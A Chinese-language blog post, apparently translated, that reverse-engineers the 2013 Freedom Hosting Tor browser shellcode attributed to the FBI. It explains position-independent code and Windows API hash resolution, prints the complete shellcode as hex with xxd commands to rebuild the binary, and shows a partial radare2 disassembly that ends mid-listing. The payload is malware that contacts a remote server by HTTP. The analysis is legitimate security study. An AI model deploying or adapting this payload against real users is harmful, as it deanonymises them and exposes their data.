<p>先说说，逆向真累，得一点点跟着函数流前进探索。靠反汇编引擎可不靠谱，跟着流程才是王道啊。</p>
<p>注释真是非常重要，为何要用IDA真是一目了然啊</p>
<p>来源：</p>
<ul>
<li><a href="http://ghowen.me/fbi-tor-malware-analysis/" target="_blank" rel="external">Analysis of the FBI Tor Malware</a></li>
<li><a href="https://www.virustotal.com/en/file/74414c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0/analysis/" target="_blank" rel="external">Virustotal</a></li>
<li><a href="http://pastebin.com/aFUP2gLB" target="_blank" rel="external">Freedom Hosting FBI Shellcode Payload..</a></li>
<li><a href="http://www.blizzhackers.cc/viewtopic.php?f=52&amp;t=496643&amp;start=15" target="_blank" rel="external">Re:”Remembering ‘08” Remembering Tor</a></li>
<li><a href="http://pastebin.com/K61QZpzb" target="_blank" rel="external">redirector</a></li>
<li><a href="http://pastebin.com/GZ1Kg3cb" target="_blank" rel="external">infector</a></li>
<li><a href="http://pastebin.com/gVna4pi2" target="_blank" rel="external">shellcode</a></li>
</ul>
<p>Tor是一个让人们不被追踪地浏览网页和获取服务的匿名网络。作为这个网络的一部分，存在所谓的“<a href="http://www.zhihu.com/question/22759179" target="_blank" rel="external">暗网</a>”。这些网络只能通过Tor连接。虽然很多服务是无辜的或者抵制人权滥用，网络的匿名性也吸引了有目的的犯罪比如儿童色情。法律机构<a href="http://en.wikipedia.org/wiki/Tor\_(anonymity_network" target="_blank" rel="external">无法</a>#Hidden_services)追踪到源IP地址。</p>
<p>2013年，在Freedom Hosting的暗网服务器上发现了一个恶意程序，该程序挖掘特定浏览器的漏洞并在用户计算机上执行程序。该程序搜集用户信息并发送到Virginia的服务器，然后使浏览器崩溃。它没有明显的恶意程序特征。因此有猜测这个程序是在Virginia有办公室的的FBI制作的。FBI<a href="http://en.wikipedia.org/wiki/Computer_and_Internet_Protocol_Address_Verifier" target="_blank" rel="external">有权编写恶意程序</a>。看起来这个猜测是<a href="http://www.wired.com/threatlevel/2013/09/freedom-hosting-fbi/" target="_blank" rel="external">真的</a>。现在已经确认为FBI代号为<a href="http://cryptome.org/2013/10/nsa-egotisticalgiraffe.pdf" target="_blank" rel="external"> EgotisticalGiraffe</a>的作品。</p>
<h2 id="逆向之">逆向之</h2><h3 id="漏洞挖掘程序">漏洞挖掘程序</h3><p>漏洞挖掘程序是javascript写的，挖掘了一个特定版本firefox的已知bug。挖掘程序经过充分混淆但是快速扫描能找到很长的16进制字符串，在前几个字符能明显看到操作符(通常在shellcode开头有jmp或者call，知道这一点就很容易找到shellcode了)。</p>
<p>首先，攻击者在网页中嵌入了一个链接向恶意页面的<code>iframe</code>，将受害者定向到感染页面。参见这里<a href="http://pastebin.com/bu2Ya0n6" target="_blank" rel="external">Freedom Hosting FBI IFRAME Redirector Malware Script</a>。</p>
<p>在受害者被重定向到真正的感染页面后，在三个iframe之间执行js，进一步混淆执行流程。最终触发漏洞，注入shellcode。参见<a href="http://pastebin.com/RTwsyrH8" target="_blank" rel="external">Freedom Hosting FBI Malware Infector (ForPayload) JavaScript</a></p>
<p>js那部分就不说了，我们看看shellcode。</p>
<h3 id="位置独立代码">位置独立代码</h3><p>shellcode必须直接注入进程运行。它不知道自己会被注入到什么位置，也不知道Windows API函数的地址。</p>
<p>因此，必须想些办法获取这些信息。FBI的这个程序使用了一个找到地址的常用方法：</p>
<pre><code><span class="built_in">call</span> start
<span class="keyword">star</span><span class="variable">t:</span>
<span class="keyword">pop</span> ebp
</code></pre><p><code>call start</code>做了两件事，首先，把下一个要执行的指令的地址即<code>pop ebp</code>的地址压入栈，然后跳转到<code>start</code>标签位置，就是继续执行<code>pop ebp</code>。再执行完<code>pop ebp</code>后，<code>pop ebp</code>的地址就存入了<code>ebp</code>寄存器。以此为标准就能获取shellcode中的其它数据。</p>
<h3 id="定位Windows_API">定位Windows API</h3><p>译者：啊啊啊啊啊，都忘记这部分怎么回事了。大家可以看看</p>
<ul>
<li><a href="http://projectshellcode.com/?q=node/12" target="_blank" rel="external">Project shellcode上的教程</a>。</li>
<li>有本专讲win32 shellcode的书<a href="nologin.org/Downloads/Papers/win32-shellcode.pdf">Understanding Windows Shellcode</a></li>
<li><a href="http://www.codeproject.com/Articles/325776/The-Art-of-Win-Shellcoding" target="_blank" rel="external">The Art of Win32 Shellcoding</a></li>
</ul>
<p>应用程序知道Windows载入的API在哪里，但shellcode不会知道。常见方法是查看<code>fs</code>寄存器指向的<a href="http://en.wikipedia.org/wiki/Win32_Thread_Information_Block" target="_blank" rel="external">线程信息块(TIB)</a>.通过这个结构可以定位宿主程序DLL函数的位置，遍历DLL导出表知道找到函数。此过程非常无聊，所以FBI都使用了Metasploit项目<a href="https://github.com/iagox86/nbtool/blob/master/samples/shellcode-win32/block_api.asm" target="_blank" rel="external">Stephen Fewer的函数解析器</a>。</p>
<pre><code><span class="keyword">push</span> arguments
...
<span class="keyword">push</span> FUNCTIONHASH
<span class="keyword">call</span> Stephen的解析器
</code></pre><p>函数哈希通过对函数名简单的哈希算法实现，你可以用别人做好的<a href="http://scriptjunkie1.110mb.com/hashes/index.html" target="_blank" rel="external">哈希表</a>,可以用别人的哈希计算<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/hash.py" target="_blank" rel="external">程序</a>，甚至<a href="http://projectshellcode.com/node/21" target="_blank" rel="external">自己在shellcode中计算</a>。</p>
<h2 id="开始">开始</h2><p>首先先获取shellcode吧，把以下一堆hex保存到<code>input.txt</code>里</p>
<pre><code>60FCE<span class="number">88A00000060</span><span class="number">89E531D26</span><span class="number">48B52308B52</span><span class="number">0C8B52148</span>B72280FB74A2631FF31C0AC<span class="number">3C617C02</span>2C20C1CF<span class="number">0D01C7E2</span>F<span class="number">052578B52</span><span class="number">108B423C01</span>D<span class="number">08B407885</span>C<span class="number">0744A01D05</span><span class="number">08B48188B58</span><span class="number">2001D3E33</span>C<span class="number">498B348</span>B01D631FF31C0ACC1CF<span class="number">0D01C738</span>E<span class="number">075F4037</span>DF<span class="number">83B7D2475</span>E<span class="number">2588B58240</span><span class="number">1D3668B0</span>C<span class="number">4B8B581</span>C<span class="number">01D38B048</span>B<span class="number">01D08944242</span><span class="number">45B5B61595</span>A51FFE<span class="number">0585F5A8</span>B12EB<span class="number">86055D81</span>BDE<span class="number">90200004745</span><span class="number">542075708</span>D<span class="number">85D102000050</span><span class="number">684C77260</span>7FFD<span class="number">585C0745</span>E<span class="number">8D85D80200</span><span class="number">0050684C77</span>2607FFD<span class="number">585C0744</span>CBB<span class="number">9001000029</span>DC<span class="number">54536829806</span>B00FFD501DC<span class="number">85C07536505</span><span class="number">05050405040</span>5068EA0FDFE0FFD531DBF<span class="number">7D339C37</span><span class="number">41F89C36A108</span>DB<span class="number">5E102000056</span><span class="number">536899A57</span>461FFD<span class="number">585C0741</span>FFE<span class="number">8D89000000</span>75E380BD<span class="number">4F02000001</span><span class="number">7407E83B01</span>0000EB<span class="number">05E84D01000</span>0FFE<span class="number">7B80001000</span><span class="number">029C489</span>E<span class="number">252505268B64</span>9DE01FFD<span class="number">55F81C40001</span><span class="number">000085C00</span>F<span class="number">85F200000057</span>E<span class="number">8F90000005</span>E89CA8DBDE<span class="number">9020000E8</span>EB<span class="number">0000004F83</span>FA207C05BA<span class="number">2000000089</span>D<span class="number">156F3A4B90</span>D<span class="number">0000008</span>DB<span class="number">5C4020000</span>F3A489BD<span class="number">4B0200005</span>E<span class="number">5668A92834</span>80FFD<span class="number">585C00F84</span>AA<span class="number">000000668</span>B<span class="number">480A6683</span>F<span class="number">9040F829</span>C<span class="number">0000008D40</span><span class="number">0C8B008</span>B<span class="number">088B09B80</span><span class="number">00100005089</span>E<span class="number">729C489</span>E<span class="number">657565151684</span><span class="number">872D2B8</span>FFD<span class="number">585C081</span>C<span class="number">4040100000</span>FB<span class="number">70F83F90672</span>6CB<span class="number">906000000</span>B<span class="number">81000000029</span>C<span class="number">489E789</span>CAD<span class="number">1E2505231D28</span><span class="keyword">A</span><span class="number">1688D024</span>F<span class="number">0C0E8043</span>C<span class="number">0977040430</span>EB<span class="number">02043788074</span><span class="number">788D0240</span>F<span class="number">3C09770404</span>30EB<span class="number">02043788074</span><span class="number">746E2D45</span>929CF89FE5801C48BBD<span class="number">4B020000</span>F<span class="number">3A4C6854</span>F<span class="number">02000001E82</span>E<span class="number">00000031C05</span>05129CF<span class="number">4F575368</span>C2EB385FFFD<span class="number">55368756E4</span>D61FFD5E9C8FEFFFF<span class="number">31C9F7D131</span>C0F2AEF<span class="number">7D149C30000</span><span class="number">0000008</span>DBDE<span class="number">9020000E8</span>E4FFFFFF4FB<span class="number">94F0000008</span>DB<span class="number">575020000</span>F3A48DBDE<span class="number">9020000E8</span>CBFFFFFFC<span class="number">30D0A436</span>F<span class="number">6E6E65637</span><span class="number">4696F6E3</span><span class="keyword">A</span><span class="number">206B6565702</span>D<span class="number">616C69766</span><span class="number">50D0A41636</span><span class="number">36570743A202</span><span class="keyword">A</span><span class="number">2F2A0D0</span><span class="keyword">A</span><span class="number">41636365707</span><span class="number">42D456E63</span><span class="number">6F64696E67</span><span class="number">3A20677A69</span><span class="number">700D0A0</span>D<span class="number">0A0083C70</span>E<span class="number">31C9F7D131</span>C0F3AE4FFFE<span class="number">70D0A436</span>F<span class="number">6F6B69653</span><span class="keyword">A</span><span class="number">2049443D77</span><span class="number">73325F333200</span><span class="number">4950484C50</span><span class="number">415049000200</span>005041DECA<span class="number">36474554202</span>F<span class="number">303563656134</span><span class="number">64652D39353</span><span class="number">1642D34303</span><span class="number">3372D62663</span><span class="number">8662D66363</span><span class="number">93035356232</span><span class="number">37396262204</span><span class="number">85454502F31</span><span class="number">2E310D0</span><span class="keyword">A</span><span class="number">486F73743</span><span class="keyword">A</span><span class="number">200000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">0000090</span>
</code></pre><p>然后使用<code>xxd</code>转化为二进制文件。</p>
<pre><code>$ xxd -r -<span class="tag">p</span> hex_input<span class="class">.txt</span> magneto<span class="class">.payload</span><span class="class">.shellcode</span>
$ ls -al magneto<span class="class">.payload</span><span class="class">.shellcode</span>
-rw-r--r-- <span class="number">1</span> reverland reverland <span class="number">956</span> Aug <span class="number">14</span> <span class="number">19</span>:<span class="number">29</span> magneto<span class="class">.payload</span><span class="class">.shellcode</span>
$ sha256sum magneto<span class="class">.payload</span><span class="class">.shellcode</span>
<span class="number">74414</span>c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0  magneto<span class="class">.payload</span><span class="class">.shellcode</span>
</code></pre><p>首先反汇编shellcode：</p>
<pre><code> ~/Work/project/reverse/<span class="keyword">test</span> ⮀ <span class="literal">r2</span> -b <span class="number">32</span> -k w32 -a x86 magneto.payload.shellcode
 -- Everything <span class="preprocessor">up</span>-to-date.
[<span class="number">0x00000000</span>]&gt; pD <span class="number">956</span>
            <span class="number">0x00000000</span>    <span class="number">60</span>           <span class="keyword">pushad</span>
            <span class="number">0x00000001</span>    fc           <span class="keyword">cld</span>
            <span class="number">0x00000002</span>    e88a000000   <span class="keyword">call</span> <span class="number">0x91</span>
               <span class="number">0x00000091</span>(unk)
            <span class="number">0x00000007</span>    <span class="number">60</span>           <span class="keyword">pushad</span>
            <span class="number">0x00000008</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
            <span class="number">0x0000000a</span>    31d2         <span class="keyword">xor</span> <span class="literal">edx</span>, <span class="literal">edx</span>
            <span class="number">0x0000000c</span>    648b5230     <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">fs</span>:<span class="literal">edx</span>+<span class="number">0x30</span>]
            <span class="number">0x00000010</span>    8b520c       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0xc</span>]
            <span class="number">0x00000013</span>    8b5214       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0x14</span>]
   .------&gt; <span class="number">0x00000016</span>    8b7228       <span class="keyword">mov</span> <span class="literal">esi</span>, [<span class="literal">edx</span>+<span class="number">0x28</span>]
   |        <span class="number">0x00000019</span>    0fb74a26     <span class="keyword">movzx</span> <span class="literal">ecx</span>, <span class="preprocessor">word</span> [<span class="literal">edx</span>+<span class="number">0x26</span>]
   |        <span class="number">0x0000001d</span>    31ff         <span class="keyword">xor</span> <span class="literal">edi</span>, <span class="literal">edi</span>
   |   .--&gt; <span class="number">0x0000001f</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
   |   |    <span class="number">0x00000021</span>    ac           <span class="keyword">lodsb</span>
   |   |    <span class="number">0x00000022</span>    3c61         <span class="keyword">cmp</span> <span class="literal">al</span>, <span class="number">0x61</span>
   |   |,=&lt; <span class="number">0x00000024</span>    7c02         <span class="keyword">jl</span> <span class="number">0x28</span>
   |   ||   <span class="number">0x00000026</span>    2c20         <span class="keyword">sub</span> <span class="literal">al</span>, <span class="number">0x20</span>
   |   |<span class="string">`-&gt; 0x00000028    c1cf0d       ror edi, 0xd
   |   |    0x0000002b    01c7         add edi, eax
   |   `</span>==&lt; <span class="number">0x0000002d</span>    e2f0         <span class="keyword">loop</span> <span class="number">0x1f</span>
   |        <span class="number">0x0000002f</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
   |        <span class="number">0x00000030</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
   |        <span class="number">0x00000031</span>    8b5210       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0x10</span>]
   |        <span class="number">0x00000034</span>    8b423c       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">edx</span>+<span class="number">0x3c</span>]
   |        <span class="number">0x00000037</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
   |        <span class="number">0x00000039</span>    8b4078       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">eax</span>+<span class="number">0x78</span>]
   |        <span class="number">0x0000003c</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
   |  ,===&lt; <span class="number">0x0000003e</span>    744a         <span class="keyword">je</span> <span class="number">0x8a</span>
   |  |     <span class="number">0x00000040</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x00000042</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
   |  |     <span class="number">0x00000043</span>    8b4818       <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">eax</span>+<span class="number">0x18</span>]
   |  |     <span class="number">0x00000046</span>    8b5820       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x20</span>]
   |  |     <span class="number">0x00000049</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
   |.-----&gt; <span class="number">0x0000004b</span>    e33c         <span class="keyword">jecxz</span> <span class="number">0x89</span>
   || |     <span class="number">0x0000004d</span>    <span class="number">49</span>           <span class="keyword">dec</span> <span class="literal">ecx</span>
   || |     <span class="number">0x0000004e</span>    8b348b       <span class="keyword">mov</span> <span class="literal">esi</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">4</span>]
   || |     <span class="number">0x00000051</span>    01d6         <span class="keyword">add</span> <span class="literal">esi</span>, <span class="literal">edx</span>
   || |     <span class="number">0x00000053</span>    31ff         <span class="keyword">xor</span> <span class="literal">edi</span>, <span class="literal">edi</span>
   ||.----&gt; <span class="number">0x00000055</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
   ||||     <span class="number">0x00000057</span>    ac           <span class="keyword">lodsb</span>
   ||||     <span class="number">0x00000058</span>    c1cf0d       <span class="keyword">ror</span> <span class="literal">edi</span>, <span class="number">0xd</span>
   ||||     <span class="number">0x0000005b</span>    01c7         <span class="keyword">add</span> <span class="literal">edi</span>, <span class="literal">eax</span>
   ||||     <span class="number">0x0000005d</span>    38e0         <span class="keyword">cmp</span> <span class="literal">al</span>, <span class="number">ah</span>
   ||<span class="string">`====&lt; 0x0000005f    75f4         jne 0x55
   || |     0x00000061    037df8       add edi, [ebp-0x8]
   || |     0x00000064    3b7d24       cmp edi, [ebp+0x24]
   |`</span>=====&lt; <span class="number">0x00000067</span>    75e2         <span class="keyword">jne</span> <span class="number">0x4b</span>
   |  |     <span class="number">0x00000069</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
   |  |     <span class="number">0x0000006a</span>    8b5824       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x24</span>]
   |  |     <span class="number">0x0000006d</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x0000006f</span>    668b0c4b     <span class="keyword">mov</span> <span class="literal">cx</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">2</span>]
   |  |     <span class="number">0x00000073</span>    8b581c       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x1c</span>]
   |  |     <span class="number">0x00000076</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x00000078</span>    8b048b       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">4</span>]
   |  |     <span class="number">0x0000007b</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
   |  |     <span class="number">0x0000007d</span>    <span class="number">89442424</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x24</span>], <span class="literal">eax</span>
   |  |     <span class="number">0x00000081</span>    5b           <span class="keyword">pop</span> <span class="literal">ebx</span>
   |  |     <span class="number">0x00000082</span>    5b           <span class="keyword">pop</span> <span class="literal">ebx</span>
   |  |     <span class="number">0x00000083</span>    <span class="number">61</span>           <span class="keyword">popad</span>
   |  |     <span class="number">0x00000084</span>    <span class="number">59</span>           <span class="keyword">pop</span> <span class="literal">ecx</span>
   |  |     <span class="number">0x00000085</span>    5a           <span class="keyword">pop</span> <span class="literal">edx</span>
   |  |     <span class="number">0x00000086</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
   |  |     <span class="number">0x00000087</span>    ffe0         <span class="keyword">jmp</span> <span class="literal">eax</span>
   |  |     <span class="number">0x00000089</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
   |  <span class="string">`---&gt; 0x0000008a    5f           pop edi
   |        0x0000008b    5a           pop edx
   |        0x0000008c    8b12         mov edx, [edx]
   `</span>======&lt; <span class="number">0x0000008e</span>    eb86         <span class="keyword">jmp</span> <span class="number">0x16</span>
</code></pre><p>首先</p>
<pre><code><span class="keyword">pushad</span>
<span class="keyword">cld</span>
</code></pre><p>将寄存器内容保存在堆栈上并清空寄存器内容。</p>
<p>然后可以看到从<code>0x00000002</code>调用<code>0x00000091</code>。那从<code>0x00000007</code>开始是啥？参考之前stephen的函数解析器，一直到<code>0x0000008e</code>都是解析器。唉？<code>0x90</code>是啥？到<code>0x00000091</code>开始：</p>
<pre><code>[<span class="number">0x00000000</span>]&gt; pD @<span class="number">0x91</span>
            <span class="number">0x00000091</span>    <span class="number">5d</span>           <span class="keyword">pop</span> <span class="literal">ebp</span>
            <span class="number">0x00000092</span>    81bde902000. <span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>+<span class="number">0x2e9</span>], <span class="number">0x20544547</span>
        ,=&lt; <span class="number">0x0000009c</span>    <span class="number">7570</span>         <span class="keyword">jne</span> <span class="number">0x10e</span>
        |   <span class="number">0x0000009e</span>    8d85d1020000 <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x2d1</span>]
        |   <span class="number">0x000000a4</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
        |   <span class="number">0x000000a5</span>    684c772607   <span class="keyword">push</span> <span class="number">0x726774c</span> <span class="comment">;  0x0726774c </span>
        |   <span class="number">0x000000aa</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
        |      <span class="number">0x00000000</span>(unk, unk, unk, unk, unk, unk, unk, unk)
        |   <span class="number">0x000000ac</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
       ,==&lt; <span class="number">0x000000ae</span>    745e         <span class="keyword">je</span> <span class="number">0x10e</span>
       ||   <span class="number">0x000000b0</span>    8d85d8020000 <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x2d8</span>]
       ||   <span class="number">0x000000b6</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
       ||   <span class="number">0x000000b7</span>    684c772607   <span class="keyword">push</span> <span class="number">0x726774c</span> <span class="comment">;  0x0726774c </span>
       ||   <span class="number">0x000000bc</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
       ||      <span class="number">0x00000000</span>(unk, unk)
       ||   <span class="number">0x000000be</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
      ,===&lt; <span class="number">0x000000c0</span>    744c         <span class="keyword">je</span> <span class="number">0x10e</span>
      |||   <span class="number">0x000000c2</span>    bb90010000   <span class="keyword">mov</span> <span class="literal">ebx</span>, <span class="number">0x190</span> <span class="comment">;  0x00000190 </span>
      |||   <span class="number">0x000000c7</span>    29dc         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">ebx</span>
      |||   <span class="number">0x000000c9</span>    <span class="number">54</span>           <span class="keyword">push</span> <span class="literal">esp</span>
      |||   <span class="number">0x000000ca</span>    <span class="number">53</span>           <span class="keyword">push</span> <span class="literal">ebx</span>
      |||   <span class="number">0x000000cb</span>    6829806b00   <span class="keyword">push</span> <span class="number">0x6b8029</span> <span class="comment">;  0x006b8029 </span>
      |||   <span class="number">0x000000d0</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
      |||      <span class="number">0x00000000</span>(unk, unk, unk)
      |||   <span class="number">0x000000d2</span>    01dc         <span class="keyword">add</span> <span class="literal">esp</span>, <span class="literal">ebx</span>
      |||   <span class="number">0x000000d4</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
     ,====&lt; <span class="number">0x000000d6</span>    <span class="number">7536</span>         <span class="keyword">jne</span> <span class="number">0x10e</span>
     ||||   <span class="number">0x000000d8</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000d9</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000da</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000db</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000dc</span>    <span class="number">40</span>           <span class="keyword">inc</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000dd</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000de</span>    <span class="number">40</span>           <span class="keyword">inc</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000df</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
     ||||   <span class="number">0x000000e0</span>    68ea0fdfe0   <span class="keyword">push</span> <span class="number">0xe0df0fea</span> <span class="comment">;  0xe0df0fea </span>
     ||||   <span class="number">0x000000e5</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
     ||||      <span class="number">0x00000000</span>(unk, unk, unk, unk, unk, unk, unk)
     ||||   <span class="number">0x000000e7</span>    31<span class="pseudo">db</span>         <span class="keyword">xor</span> <span class="literal">ebx</span>, <span class="literal">ebx</span>
     ||||   <span class="number">0x000000e9</span>    f7d3         <span class="keyword">not</span> <span class="literal">ebx</span>
     ||||   <span class="number">0x000000eb</span>    39c3         <span class="keyword">cmp</span> <span class="literal">ebx</span>, <span class="literal">eax</span>
    ,=====&lt; <span class="number">0x000000ed</span>    741f         <span class="keyword">je</span> <span class="number">0x10e</span>
    |||||   <span class="number">0x000000ef</span>    89c3         <span class="keyword">mov</span> <span class="literal">ebx</span>, <span class="literal">eax</span>
  .-------&gt; <span class="number">0x000000f1</span>    6a10         <span class="keyword">push</span> <span class="number">0x10</span> <span class="comment">;  0x00000010 </span>
  | |||||   <span class="number">0x000000f3</span>    8db5e1020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2e1</span>]
  | |||||   <span class="number">0x000000f9</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
  | |||||   <span class="number">0x000000fa</span>    <span class="number">53</span>           <span class="keyword">push</span> <span class="literal">ebx</span>
  | |||||   <span class="number">0x000000fb</span>    6899a57461   <span class="keyword">push</span> <span class="number">0x6174a599</span> <span class="comment">;  0x6174a599 </span>
  | |||||   <span class="number">0x00000100</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
  | |||||      <span class="number">0x00000000</span>(unk, unk, unk, unk)
  | |||||   <span class="number">0x00000102</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
  |,======&lt; <span class="number">0x00000104</span>    741f         <span class="keyword">je</span> <span class="number">0x125</span>
  |||||||   <span class="number">0x00000106</span>    fe8d89000000 <span class="keyword">dec</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x89</span>]
  <span class="string">`=======&lt; 0x0000010c    75e3         jne 0xf1
   |`</span><span class="string">```</span><span class="string">`-&gt; 0x0000010e    80bd4f02000. cmp byte [ebp+0x24f], 0x1
  ========&lt; 0x00000115    7407         je 0x11e
   |        0x00000117    e83b010000   call 0x257
   |           0x00000257()
  ========&lt; 0x0000011c    eb05         jmp 0x123
  --------&gt; 0x0000011e    e84d010000   call 0x270
          &gt;    0x00000270()
  --------&gt; 0x00000123    ffe7         jmp edi
   `</span>------&gt; <span class="number">0x00000125</span>    b800010000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x100</span> <span class="comment">;  0x00000100 </span>
            <span class="number">0x0000012a</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
            <span class="number">0x0000012c</span>    89e2         <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="literal">esp</span>
            <span class="number">0x0000012e</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
            <span class="number">0x0000012f</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
            <span class="number">0x00000130</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
            <span class="number">0x00000131</span>    68b649de01   <span class="keyword">push</span> <span class="number">0x1de49b6</span> <span class="comment">;  0x01de49b6 </span>
            <span class="number">0x00000136</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
               <span class="number">0x00000000</span>(unk, unk, unk, unk)
            <span class="number">0x00000138</span>    5f           <span class="keyword">pop</span> <span class="literal">edi</span>
            <span class="number">0x00000139</span>    81c400010000 <span class="keyword">add</span> <span class="literal">esp</span>, <span class="number">0x100</span>
            <span class="number">0x0000013f</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
  ========&lt; <span class="number">0x00000141</span>    0f85f2000000 <span class="keyword">jne</span> <span class="number">0x239</span>
            <span class="number">0x00000147</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
            <span class="number">0x00000148</span>    e8f9000000   <span class="keyword">call</span> <span class="number">0x246</span>
               <span class="number">0x00000246</span>(unk)
            <span class="number">0x0000014d</span>    5e           <span class="keyword">pop</span> <span class="literal">esi</span>
            <span class="number">0x0000014e</span>    89ca         <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="literal">ecx</span>
            <span class="number">0x00000150</span>    8dbde9020000 <span class="keyword">lea</span> <span class="literal">edi</span>, [<span class="literal">ebp</span>+<span class="number">0x2e9</span>]
            <span class="number">0x00000156</span>    e8eb000000   <span class="keyword">call</span> <span class="number">0x246</span>
               <span class="number">0x00000246</span>()
            <span class="number">0x0000015b</span>    4f           <span class="keyword">dec</span> <span class="literal">edi</span>
            <span class="number">0x0000015c</span>    83fa20       <span class="keyword">cmp</span> <span class="literal">edx</span>, <span class="number">0x20</span>
  ========&lt; <span class="number">0x0000015f</span>    7c05         <span class="keyword">jl</span> <span class="number">0x166</span>
            <span class="number">0x00000161</span>    ba20000000   <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="number">0x20</span> <span class="comment">;  0x00000020 </span>
  --------&gt; <span class="number">0x00000166</span>    89d1         <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="literal">edx</span>
